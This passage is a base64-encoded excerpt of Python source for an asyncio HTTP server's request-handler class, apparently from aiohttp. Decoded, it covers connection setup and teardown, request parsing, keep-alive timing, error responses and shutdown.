G9vcClcclxuXHJcbiAgICAgICAgc2VsZi5fcmVxdWVzdF9jb3VudCA9IDBcclxuICAgICAgICBzZWxmLl9rZWVwYWxpdmUgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX2N1cnJlbnRfcmVxdWVzdCA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbQmFzZVJlcXVlc3RdXHJcbiAgICAgICAgc2VsZi5fbWFuYWdlciA9IG1hbmFnZXIgICMgdHlwZTogT3B0aW9uYWxbU2VydmVyXVxyXG4gICAgICAgIHNlbGYuX3JlcXVlc3RfaGFuZGxlcjogT3B0aW9uYWxbX1JlcXVlc3RIYW5kbGVyXSA9IG1hbmFnZXIucmVxdWVzdF9oYW5kbGVyXHJcbiAgICAgICAgc2VsZi5fcmVxdWVzdF9mYWN0b3J5OiBPcHRpb25hbFtfUmVxdWVzdEZhY3RvcnldID0gbWFuYWdlci5yZXF1ZXN0X2ZhY3RvcnlcclxuXHJcbiAgICAgICAgc2VsZi5fdGNwX2tlZXBhbGl2ZSA9IHRjcF9rZWVwYWxpdmVcclxuICAgICAgICAjIHBsYWNlaG9sZGVyIHRvIGJlIHJlcGxhY2VkIG9uIGtlZXBhbGl2ZSB0aW1lb3V0IHNldHVwXHJcbiAgICAgICAgc2VsZi5fa2VlcGFsaXZlX3RpbWUgPSAwLjBcclxuICAgICAgICBzZWxmLl9rZWVwYWxpdmVfaGFuZGxlID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLkhhbmRsZV1cclxuICAgICAgICBzZWxmLl9rZWVwYWxpdmVfdGltZW91dCA9IGtlZXBhbGl2ZV90aW1lb3V0XHJcbiAgICAgICAgc2VsZi5fbGluZ2VyaW5nX3RpbWUgPSBmbG9hdChsaW5nZXJpbmdfdGltZSlcclxuXHJcbiAgICAgICAgc2VsZi5fbWVzc2FnZXM6IERlcXVlW19Nc2dUeXBlXSA9IGRlcXVlKClcclxuICAgICAgICBzZWxmLl9tZXNzYWdlX3RhaWwgPSBiIiJcclxuXHJcbiAgICAgICAgc2VsZi5fd2FpdGVyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLkZ1dHVyZVtOb25lXV1cclxuICAgICAgICBzZWxmLl90YXNrX2hhbmRsZXIgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2FzeW5jaW8uVGFza1tOb25lXV1cclxuXHJcbiAgICAgICAgc2VsZi5fdXBncmFkZSA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fcGF5bG9hZF9wYXJzZXIgPSBOb25lICAjIHR5cGU6IEFueVxyXG4gICAgICAgIHNlbGYuX3JlcXVlc3RfcGFyc2VyID0gSHR0cFJlcXVlc3RQYXJzZXIoXHJcbiAgICAgICAgICAgIHNlbGYsXHJcbiAgICAgICAgICAgIGxvb3AsXHJcbiAgICAgICAgICAgIHJlYWRfYnVmc2l6ZSxcclxuICAgICAgICAgICAgbWF4X2xpbmVfc2l6ZT1tYXhfbGluZV9zaXplLFxyXG4gICAgICAgICAgICBtYXhfZmllbGRfc2l6ZT1tYXhfZmllbGRfc2l6ZSxcclxuICAgICAgICAgICAgbWF4X2hlYWRlcnM9bWF4X2hlYWRlcnMsXHJcbiAgICAgICAgICAgIHBheWxvYWRfZXhjZXB0aW9uPVJlcXVlc3RQYXlsb2FkRXJyb3IsXHJcbiAgICAgICAgICAgIGF1dG9fZGVjb21wcmVzcz1hdXRvX2RlY29tcHJlc3MsXHJcbiAgICAgICAgKSAgIyB0eXBlOiBPcHRpb25hbFtIdHRwUmVxdWVzdFBhcnNlcl1cclxuXHJcbiAgICAgICAgc2VsZi5sb2dnZXIgPSBsb2dnZXJcclxuICAgICAgICBzZWxmLmRlYnVnID0gZGVidWdcclxuICAgICAgICBzZWxmLmFjY2Vzc19sb2cgPSBhY2Nlc3NfbG9nXHJcbiAgICAgICAgaWYgYWNjZXNzX2xvZzpcclxuICAgICAgICAgICAgc2VsZi5hY2Nlc3NfbG9nZ2VyID0gYWNjZXNzX2xvZ19jbGFzcyhcclxuICAgICAgICAgICAgICAgIGFjY2Vzc19sb2csIGFjY2Vzc19sb2dfZm9ybWF0XHJcbiAgICAgICAgICAgICkgICMgdHlwZTogT3B0aW9uYWxbQWJzdHJhY3RBY2Nlc3NMb2dnZXJdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5hY2Nlc3NfbG9nZ2VyID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLl9jbG9zZSA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fZm9yY2VfY2xvc2UgPSBGYWxzZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8e30ge30+Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgIHNlbGYuX19jbGFzc19fLl9fbmFtZV9fLFxyXG4gICAgICAgICAgICAiY29ubmVjdGVkIiBpZiBzZWxmLnRyYW5zcG9ydCBpcyBub3QgTm9uZSBlbHNlICJkaXNjb25uZWN0ZWQiLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZWVwYWxpdmVfdGltZW91dChzZWxmKSAtPiBmbG9hdDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fa2VlcGFsaXZlX3RpbWVvdXRcclxuXHJcbiAgICBhc3luYyBkZWYgc2h1dGRvd24oc2VsZiwgdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gMTUuMCkgLT4gTm9uZTpcclxuICAgICAgICAiIiJEbyB3b3JrZXIgcHJvY2VzcyBleGl0IHByZXBhcmF0aW9ucy5cclxuXHJcbiAgICAgICAgV2UgbmVlZCB0byBjbGVhbiB1cCBldmVyeXRoaW5nIGFuZCBzdG9wIGFjY2VwdGluZyByZXF1ZXN0cy5cclxuICAgICAgICBJdCBpcyBlc3BlY2lhbGx5IGltcG9ydGFudCBmb3Iga2VlcC1hbGl2ZSBjb25uZWN0aW9ucy5cclxuICAgICAgICAiIiJcclxuICAgICAgICBzZWxmLl9mb3JjZV9jbG9zZSA9IFRydWVcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fa2VlcGFsaXZlX2hhbmRsZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fa2VlcGFsaXZlX2hhbmRsZS5jYW5jZWwoKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl93YWl0ZXI6XHJcbiAgICAgICAgICAgIHNlbGYuX3dhaXRlci5jYW5jZWwoKVxyXG5cclxuICAgICAgICAjIHdhaXQgZm9yIGhhbmRsZXJzXHJcbiAgICAgICAgd2l0aCBzdXBwcmVzcyhhc3luY2lvLkNhbmNlbGxlZEVycm9yLCBhc3luY2lvLlRpbWVvdXRFcnJvcik6XHJcbiAgICAgICAgICAgIGFzeW5jIHdpdGggY2VpbF90aW1lb3V0KHRpbWVvdXQpOlxyXG4gICAgICAgICAgICAgICAgaWYgc2VsZi5fY3VycmVudF9yZXF1ZXN0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2N1cnJlbnRfcmVxdWVzdC5fY2FuY2VsKGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3IoKSlcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl90YXNrX2hhbmRsZXIgaXMgbm90IE5vbmUgYW5kIG5vdCBzZWxmLl90YXNrX2hhbmRsZXIuZG9uZSgpOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuX3Rhc2tfaGFuZGxlclxyXG5cclxuICAgICAgICAjIGZvcmNlLWNsb3NlIG5vbi1pZGxlIGhhbmRsZXJcclxuICAgICAgICBpZiBzZWxmLl90YXNrX2hhbmRsZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3Rhc2tfaGFuZGxlci5jYW5jZWwoKVxyXG5cclxuICAgICAgICBpZiBzZWxmLnRyYW5zcG9ydCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi50cmFuc3BvcnQuY2xvc2UoKVxyXG4gICAgICAgICAgICBzZWxmLnRyYW5zcG9ydCA9IE5vbmVcclxuXHJcbiAgICBkZWYgY29ubmVjdGlvbl9tYWRlKHNlbGYsIHRyYW5zcG9ydDogYXN5bmNpby5CYXNlVHJhbnNwb3J0KSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuY29ubmVjdGlvbl9tYWRlKHRyYW5zcG9ydClcclxuXHJcbiAgICAgICAgcmVhbF90cmFuc3BvcnQgPSBjYXN0KGFzeW5jaW8uVHJhbnNwb3J0LCB0cmFuc3BvcnQpXHJcbiAgICAgICAgaWYgc2VsZi5fdGNwX2tlZXBhbGl2ZTpcclxuICAgICAgICAgICAgdGNwX2tlZXBhbGl2ZShyZWFsX3RyYW5zcG9ydClcclxuXHJcbiAgICAgICAgc2VsZi5fdGFza19oYW5kbGVyID0gc2VsZi5fbG9vcC5jcmVhdGVfdGFzayhzZWxmLnN0YXJ0KCkpXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX21hbmFnZXIgaXMgbm90IE5vbmVcclxuICAgICAgICBzZWxmLl9tYW5hZ2VyLmNvbm5lY3Rpb25fbWFkZShzZWxmLCByZWFsX3RyYW5zcG9ydClcclxuXHJcbiAgICBkZWYgY29ubmVjdGlvbl9sb3N0KHNlbGYsIGV4YzogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl0pIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fbWFuYWdlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBzZWxmLl9tYW5hZ2VyLmNvbm5lY3Rpb25fbG9zdChzZWxmLCBleGMpXHJcblxyXG4gICAgICAgIHN1cGVyKCkuY29ubmVjdGlvbl9sb3N0KGV4YylcclxuXHJcbiAgICAgICAgc2VsZi5fbWFuYWdlciA9IE5vbmVcclxuICAgICAgICBzZWxmLl9mb3JjZV9jbG9zZSA9IFRydWVcclxuICAgICAgICBzZWxmLl9yZXF1ZXN0X2ZhY3RvcnkgPSBOb25lXHJcbiAgICAgICAgc2VsZi5fcmVxdWVzdF9oYW5kbGVyID0gTm9uZVxyXG4gICAgICAgIHNlbGYuX3JlcXVlc3RfcGFyc2VyID0gTm9uZVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9rZWVwYWxpdmVfaGFuZGxlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9rZWVwYWxpdmVfaGFuZGxlLmNhbmNlbCgpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2N1cnJlbnRfcmVxdWVzdCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgaWYgZXhjIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICBleGMgPSBDb25uZWN0aW9uUmVzZXRFcnJvcigiQ29ubmVjdGlvbiBsb3N0IilcclxuICAgICAgICAgICAgc2VsZi5fY3VycmVudF9yZXF1ZXN0Ll9jYW5jZWwoZXhjKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl90YXNrX2hhbmRsZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3Rhc2tfaGFuZGxlci5jYW5jZWwoKVxyXG4gICAgICAgIGlmIHNlbGYuX3dhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVyLmNhbmNlbCgpXHJcblxyXG4gICAgICAgIHNlbGYuX3Rhc2tfaGFuZGxlciA9IE5vbmVcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fcGF5bG9hZF9wYXJzZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyLmZlZWRfZW9mKClcclxuICAgICAgICAgICAgc2VsZi5fcGF5bG9hZF9wYXJzZXIgPSBOb25lXHJcblxyXG4gICAgZGVmIHNldF9wYXJzZXIoc2VsZiwgcGFyc2VyOiBBbnkpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBBY3R1YWwgdHlwZSBpcyBXZWJSZWFkZXJcclxuICAgICAgICBhc3NlcnQgc2VsZi5fcGF5bG9hZF9wYXJzZXIgaXMgTm9uZVxyXG5cclxuICAgICAgICBzZWxmLl9wYXlsb2FkX3BhcnNlciA9IHBhcnNlclxyXG5cclxuICAgICAgICBpZiBzZWxmLl9tZXNzYWdlX3RhaWw6XHJcbiAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyLmZlZWRfZGF0YShzZWxmLl9tZXNzYWdlX3RhaWwpXHJcbiAgICAgICAgICAgIHNlbGYuX21lc3NhZ2VfdGFpbCA9IGIiIlxyXG5cclxuICAgIGRlZiBlb2ZfcmVjZWl2ZWQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBwYXNzXHJcblxyXG4gICAgZGVmIGRhdGFfcmVjZWl2ZWQoc2VsZiwgZGF0YTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fZm9yY2VfY2xvc2Ugb3Igc2VsZi5fY2xvc2U6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgICMgcGFyc2UgaHR0cCBtZXNzYWdlc1xyXG4gICAgICAgIG1lc3NhZ2VzOiBTZXF1ZW5jZVtfTXNnVHlwZV1cclxuICAgICAgICBpZiBzZWxmLl9wYXlsb2FkX3BhcnNlciBpcyBOb25lIGFuZCBub3Qgc2VsZi5fdXBncmFkZTpcclxuICAgICAgICAgICAgYXNzZXJ0IHNlbGYuX3JlcXVlc3RfcGFyc2VyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIG1lc3NhZ2VzLCB1cGdyYWRlZCwgdGFpbCA9IHNlbGYuX3JlcXVlc3RfcGFyc2VyLmZlZWRfZGF0YShkYXRhKVxyXG4gICAgICAgICAgICBleGNlcHQgSHR0cFByb2Nlc3NpbmdFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICBtZXNzYWdlcyA9IFtcclxuICAgICAgICAgICAgICAgICAgICAoX0VyckluZm8oc3RhdHVzPTQwMCwgZXhjPWV4YywgbWVzc2FnZT1leGMubWVzc2FnZSksIEVNUFRZX1BBWUxPQUQpXHJcbiAgICAgICAgICAgICAgICBdXHJcbiAgICAgICAgICAgICAgICB1cGdyYWRlZCA9IEZhbHNlXHJcbiAgICAgICAgICAgICAgICB0YWlsID0gYiIiXHJcblxyXG4gICAgICAgICAgICBmb3IgbXNnLCBwYXlsb2FkIGluIG1lc3NhZ2VzIG9yICgpOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fcmVxdWVzdF9jb3VudCArPSAxXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9tZXNzYWdlcy5hcHBlbmQoKG1zZywgcGF5bG9hZCkpXHJcblxyXG4gICAgICAgICAgICB3YWl0ZXIgPSBzZWxmLl93YWl0ZXJcclxuICAgICAgICAgICAgaWYgbWVzc2FnZXMgYW5kIHdhaXRlciBpcyBub3QgTm9uZSBhbmQgbm90IHdhaXRlci5kb25lKCk6XHJcbiAgICAgICAgICAgICAgICAjIGRvblwndCBzZXQgcmVzdWx0IHR3aWNlXHJcbiAgICAgICAgICAgICAgICB3YWl0ZXIuc2V0X3Jlc3VsdChOb25lKVxyXG5cclxuICAgICAgICAgICAgc2VsZi5fdXBncmFkZSA9IHVwZ3JhZGVkXHJcbiAgICAgICAgICAgIGlmIHVwZ3JhZGVkIGFuZCB0YWlsOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbWVzc2FnZV90YWlsID0gdGFpbFxyXG5cclxuICAgICAgICAjIG5vIHBhcnNlciwganVzdCBzdG9yZVxyXG4gICAgICAgIGVsaWYgc2VsZi5fcGF5bG9hZF9wYXJzZXIgaXMgTm9uZSBhbmQgc2VsZi5fdXBncmFkZSBhbmQgZGF0YTpcclxuICAgICAgICAgICAgc2VsZi5fbWVzc2FnZV90YWlsICs9IGRhdGFcclxuXHJcbiAgICAgICAgIyBmZWVkIHBheWxvYWRcclxuICAgICAgICBlbGlmIGRhdGE6XHJcbiAgICAgICAgICAgIGVvZiwgdGFpbCA9IHNlbGYuX3BheWxvYWRfcGFyc2VyLmZlZWRfZGF0YShkYXRhKVxyXG4gICAgICAgICAgICBpZiBlb2Y6XHJcbiAgICAgICAgICAgICAgICBzZWxmLmNsb3NlKClcclxuXHJcbiAgICBkZWYga2VlcF9hbGl2ZShzZWxmLCB2YWw6IGJvb2wpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiU2V0IGtlZXAtYWxpdmUgY29ubmVjdGlvbiBtb2RlLlxyXG5cclxuICAgICAgICA6cGFyYW0gYm9vbCB2YWw6IG5ldyBzdGF0ZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBzZWxmLl9rZWVwYWxpdmUgPSB2YWxcclxuICAgICAgICBpZiBzZWxmLl9rZWVwYWxpdmVfaGFuZGxlOlxyXG4gICAgICAgICAgICBzZWxmLl9rZWVwYWxpdmVfaGFuZGxlLmNhbmNlbCgpXHJcbiAgICAgICAgICAgIHNlbGYuX2tlZXBhbGl2ZV9oYW5kbGUgPSBOb25lXHJcblxyXG4gICAgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiQ2xvc2UgY29ubmVjdGlvbi5cclxuXHJcbiAgICAgICAgU3RvcCBhY2NlcHRpbmcgbmV3IHBpcGVsaW5pbmcgbWVzc2FnZXMgYW5kIGNsb3NlXHJcbiAgICAgICAgY29ubmVjdGlvbiB3aGVuIGhhbmRsZXJzIGRvbmUgcHJvY2Vzc2luZyBtZXNzYWdlcy5cclxuICAgICAgICAiIiJcclxuICAgICAgICBzZWxmLl9jbG9zZSA9IFRydWVcclxuICAgICAgICBpZiBzZWxmLl93YWl0ZXI6XHJcbiAgICAgICAgICAgIHNlbGYuX3dhaXRlci5jYW5jZWwoKVxyXG5cclxuICAgIGRlZiBmb3JjZV9jbG9zZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgICIiIkZvcmNlZnVsbHkgY2xvc2UgY29ubmVjdGlvbi4iIiJcclxuICAgICAgICBzZWxmLl9mb3JjZV9jbG9zZSA9IFRydWVcclxuICAgICAgICBpZiBzZWxmLl93YWl0ZXI6XHJcbiAgICAgICAgICAgIHNlbGYuX3dhaXRlci5jYW5jZWwoKVxyXG4gICAgICAgIGlmIHNlbGYudHJhbnNwb3J0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLnRyYW5zcG9ydC5jbG9zZSgpXHJcbiAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0ID0gTm9uZVxyXG5cclxuICAgIGRlZiBsb2dfYWNjZXNzKFxyXG4gICAgICAgIHNlbGYsIHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LCByZXNwb25zZTogU3RyZWFtUmVzcG9uc2UsIHRpbWU6IGZsb2F0XHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5hY2Nlc3NfbG9nZ2VyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLmFjY2Vzc19sb2dnZXIubG9nKHJlcXVlc3QsIHJlc3BvbnNlLCBzZWxmLl9sb29wLnRpbWUoKSAtIHRpbWUpXHJcblxyXG4gICAgZGVmIGxvZ19kZWJ1ZyhzZWxmLCAqYXJnczogQW55LCAqKmt3OiBBbnkpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5kZWJ1ZzpcclxuICAgICAgICAgICAgc2VsZi5sb2dnZXIuZGVidWcoKmFyZ3MsICoqa3cpXHJcblxyXG4gICAgZGVmIGxvZ19leGNlcHRpb24oc2VsZiwgKmFyZ3M6IEFueSwgKiprdzogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYubG9nZ2VyLmV4Y2VwdGlvbigqYXJncywgKiprdylcclxuXHJcbiAgICBkZWYgX3Byb2Nlc3Nfa2VlcGFsaXZlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fZm9yY2VfY2xvc2Ugb3Igbm90IHNlbGYuX2tlZXBhbGl2ZTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIG5leHQgPSBzZWxmLl9rZWVwYWxpdmVfdGltZSArIHNlbGYuX2tlZXBhbGl2ZV90aW1lb3V0XHJcblxyXG4gICAgICAgICMgaGFuZGxlciBpbiBpZGxlIHN0YXRlXHJcbiAgICAgICAgaWYgc2VsZi5fd2FpdGVyOlxyXG4gICAgICAgICAgICBpZiBzZWxmLl9sb29wLnRpbWUoKSA+IG5leHQ6XHJcbiAgICAgICAgICAgICAgICBzZWxmLmZvcmNlX2Nsb3NlKClcclxuICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICAjIG5vdCBhbGwgcmVxdWVzdCBoYW5kbGVycyBhcmUgZG9uZSxcclxuICAgICAgICAjIHJlc2NoZWR1bGUgaXRzZWxmIHRvIG5leHQgc2Vjb25kXHJcbiAgICAgICAgc2VsZi5fa2VlcGFsaXZlX2hhbmRsZSA9IHNlbGYuX2xvb3AuY2FsbF9sYXRlcihcclxuICAgICAgICAgICAgc2VsZi5LRUVQQUxJVkVfUkVTQ0hFRFVMRV9ERUxBWSwgc2VsZi5fcHJvY2Vzc19rZWVwYWxpdmVcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIF9oYW5kbGVfcmVxdWVzdChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LFxyXG4gICAgICAgIHN0YXJ0X3RpbWU6IGZsb2F0LFxyXG4gICAgICAgIHJlcXVlc3RfaGFuZGxlcjogQ2FsbGFibGVbW0Jhc2VSZXF1ZXN0XSwgQXdhaXRhYmxlW1N0cmVhbVJlc3BvbnNlXV0sXHJcbiAgICApIC0+IFR1cGxlW1N0cmVhbVJlc3BvbnNlLCBib29sXTpcclxuICAgICAgICBhc3NlcnQgc2VsZi5fcmVxdWVzdF9oYW5kbGVyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jdXJyZW50X3JlcXVlc3QgPSByZXF1ZXN0XHJcbiAgICAgICAgICAgICAgICByZXNwID0gYXdhaXQgcmVxdWVzdF9oYW5kbGVyKHJlcXVlc3QpXHJcbiAgICAgICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jdXJyZW50X3JlcXVlc3QgPSBOb25lXHJcbiAgICAgICAgZXhjZXB0IEhUVFBFeGNlcHRpb24gYXMgZXhjOlxyXG4gICAgICAgICAgICByZXNwID0gZXhjXHJcbiAgICAgICAgICAgIHJlc2V0ID0gYXdhaXQgc2VsZi5maW5pc2hfcmVzcG9uc2UocmVxdWVzdCwgcmVzcCwgc3RhcnRfdGltZSlcclxuICAgICAgICBleGNlcHQgYXN5bmNpby5DYW5jZWxsZWRFcnJvcjpcclxuICAgICAgICAgICAgcmFpc2VcclxuICAgICAgICBleGNlcHQgYXN5bmNpby5UaW1lb3V0RXJyb3IgYXMgZXhjOlxyXG4gICAgICAgICAgICBzZWxmLmxvZ19kZWJ1ZygiUmVxdWVzdCBoYW5kbGVyIHRpbWVkIG91dC4iLCBleGNfaW5mbz1leGMpXHJcbiAgICAgICAgICAgIHJlc3AgPSBzZWxmLmhhbmRsZV9lcnJvcihyZXF1ZXN0LCA1MDQpXHJcbiAgICAgICAgICAgIHJlc2V0ID0gYXdhaXQgc2VsZi5maW5pc2hfcmVzcG9uc2UocmVxdWVzdCwgcmVzcCwgc3RhcnRfdGltZSlcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4YzpcclxuICAgICAgICAgICAgcmVzcCA9IHNlbGYuaGFuZGxlX2Vycm9yKHJlcXVlc3QsIDUwMCwgZXhjKVxyXG4gICAgICAgICAgICByZXNldCA9IGF3YWl0IHNlbGYuZmluaXNoX3Jlc3BvbnNlKHJlcXVlc3QsIHJlc3AsIHN0YXJ0X3RpbWUpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgIyBEZXByZWNhdGlvbiB3YXJuaW5nIChTZWUgIzI0MTUpXHJcbiAgICAgICAgICAgIGlmIGdldGF0dHIocmVzcCwgIl9faHR0cF9leGNlcHRpb25fXyIsIEZhbHNlKTpcclxuICAgICAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICAgICAgICAgInJldHVybmluZyBIVFRQRXhjZXB0aW9uIG9iamVjdCBpcyBkZXByZWNhdGVkICJcclxuICAgICAgICAgICAgICAgICAgICAiKCMyNDE1KSBhbmQgd2lsbCBiZSByZW1vdmVkLCAiXHJcbiAgICAgICAgICAgICAgICAgICAgInBsZWFzZSByYWlzZSB0aGUgZXhjZXB0aW9uIGluc3RlYWQiLFxyXG4gICAgICAgICAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIHJlc2V0ID0gYXdhaXQgc2VsZi5maW5pc2hfcmVzcG9uc2UocmVxdWVzdCwgcmVzcCwgc3RhcnRfdGltZSlcclxuXHJcbiAgICAgICAgcmV0dXJuIHJlc3AsIHJlc2V0XHJcblxyXG4gICAgYXN5bmMgZGVmIHN0YXJ0KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiUHJvY2VzcyBpbmNvbWluZyByZXF1ZXN0LlxyXG5cclxuICAgICAgICBJdCByZWFkcyByZXF1ZXN0IGxpbmUsIHJlcXVlc3QgaGVhZGVycyBhbmQgcmVxdWVzdCBwYXlsb2FkLCB0aGVuXHJcbiAgICAgICAgY2FsbHMgaGFuZGxlX3JlcXVlc3QoKSBtZXRob2QuIFN1YmNsYXNzIGhhcyB0byBvdmVycmlkZVxyXG4gICAgICAgIGhhbmRsZV9yZXF1ZXN0KCkuIHN0YXJ0KCkgaGFuZGxlcyB2YXJpb3VzIGV4Y2VwdGlvbnMgaW4gcmVxdWVzdFxyXG4gICAgICAgIG9yIHJlc3BvbnNlIGhhbmRsaW5nLiBDb25uZWN0aW9uIGlzIGJlaW5nIGNsb3NlZCBhbHdheXMgdW5sZXNzXHJcbiAgICAgICAga2VlcF9hbGl2ZShUcnVlKSBzcGVjaWZpZWQuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgbG9vcCA9IHNlbGYuX2xvb3BcclxuICAgICAgICBoYW5kbGVyID0gc2VsZi5fdGFza19oYW5kbGVyXHJcbiAgICAgICAgYXNzZXJ0IGhhbmRsZXIgaXMgbm90IE5vbmVcclxuICAgICAgICBtYW5hZ2VyID0gc2VsZi5fbWFuYWdlclxyXG4gICAgICAgIGFzc2VydCBtYW5hZ2VyIGlzIG5vdCBOb25lXHJcbiAgICAgICAga2VlcGFsaXZlX3RpbWVvdXQgPSBzZWxmLl9rZWVwYWxpdmVfdGltZW91dFxyXG4gICAgICAgIHJlc3AgPSBOb25lXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3JlcXVlc3RfZmFjdG9yeSBpcyBub3QgTm9uZVxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9yZXF1ZXN0X2hhbmRsZXIgaXMgbm90IE5vbmVcclxuXHJcbiAgICAgICAgd2hpbGUgbm90IHNlbGYuX2ZvcmNlX2Nsb3NlOlxyXG4gICAgICAgICAgICBpZiBub3Qgc2VsZi5fbWVzc2FnZXM6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgIyB3YWl0IGZvciBuZXh0IHJlcXVlc3RcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl93YWl0ZXIgPSBsb29wLmNyZWF0ZV9mdXR1cmUoKVxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dhaXRlclxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3I6XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fd2FpdGVyID0gTm9uZVxyXG5cclxuICAgICAgICAgICAgbWVzc2FnZSwgcGF5bG9hZCA9IHNlbGYuX21lc3NhZ2VzLnBvcGxlZnQoKVxyXG5cclxuICAgICAgICAgICAgc3RhcnQgPSBsb29wLnRpbWUoKVxyXG5cclxuICAgICAgICAgICAgbWFuYWdlci5yZXF1ZXN0c19jb3VudCArPSAxXHJcbiAgICAgICAgICAgIHdyaXRlciA9IFN0cmVhbVdyaXRlcihzZWxmLCBsb29wKVxyXG4gICAgICAgICAgICBpZiBpc2luc3RhbmNlKG1lc3NhZ2UsIF9FcnJJbmZvKTpcclxuICAgICAgICAgICAgICAgICMgbWFrZSByZXF1ZXN0X2ZhY3Rvcnkgd29ya1xyXG4gICAgICAgICAgICAgICAgcmVxdWVzdF9oYW5kbGVyID0gc2VsZi5fbWFrZV9lcnJvcl9oYW5kbGVyKG1lc3NhZ2UpXHJcbiAgICAgICAgICAgICAgICBtZXNzYWdlID0gRVJST1JcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IHNlbGYuX3JlcXVlc3